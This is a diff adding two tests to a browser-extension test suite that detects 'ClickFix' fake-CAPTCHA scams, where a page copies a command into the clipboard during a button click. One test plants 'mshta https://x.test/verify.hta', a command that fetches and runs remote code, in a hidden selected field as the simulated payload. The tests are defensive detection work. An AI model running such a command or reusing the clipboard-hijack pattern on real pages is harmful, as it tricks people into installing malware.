@@ -584,6 +584,60 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
     expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
   })
 
+  it('counts a copy the page makes inside its own button click as the page\'s (B-191)', async () => {
+    // The fake CAPTCHA: "I am not a robot" runs execCommand('copy') in its click handler,
+    // and Chromium sends that copy as trusted. The person clicked a button, not Copy.
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+
+    const button = document.createElement('button')
+    button.textContent = 'I am not a robot'
+    document.body.append(button)
+    button.addEventListener('click', () => {
+      const trusted = new Event('copy', { bubbles: true })
+      Object.defineProperty(trusted, 'isTrusted', { value: true })
+      Object.defineProperty(trusted, 'clipboardData', { value: { getData: () => '' } })
+      document.dispatchEvent(trusted)
+    })
+    button.click()
+    await settle()
+
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
+  })
+
+  it('reads the command from the hidden field the page selected for the copy (B-191)', async () => {
+    // The classic shape: a textarea gets the command, is selected, execCommand('copy') runs,
+    // and the event's own data is empty. The selection is what was copied.
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+
+    const button = document.createElement('button')
+    document.body.append(button)
+    button.addEventListener('click', () => {
+      const field = document.createElement('textarea')
+      field.value = 'mshta https://x.test/verify.hta'
+      document.body.append(field)
+      field.focus()
+      field.select()
+      const trusted = new Event('copy', { bubbles: true })
+      Object.defineProperty(trusted, 'isTrusted', { value: true })
+      Object.defineProperty(trusted, 'clipboardData', { value: { getData: () => '' } })
+      document.dispatchEvent(trusted)
+      field.remove()
+    })
+    button.click()
+    await settle()
+
+    const detail = slot.current()?.root.querySelector('[data-role=detail]')?.textContent ?? ''
+    // The catalogue stub drops arguments: "copied what" instead of "unreadable" is the proof
+    // that a payload was read, and the selected field is the only place it could come from.
+    expect(detail).not.toContain('[warnClickfixUnreadable]')
+    expect(detail).toContain('[warnClickfixCopiedWhat]')
+  })
+
   it('still ignores a trusted copy outside a held link click (the person\'s own)', async () => {
     // Read on the warning it would raise: the person's own copy leaves the medium
     // sentence ("wants you to"), never the claim that the page copied something.
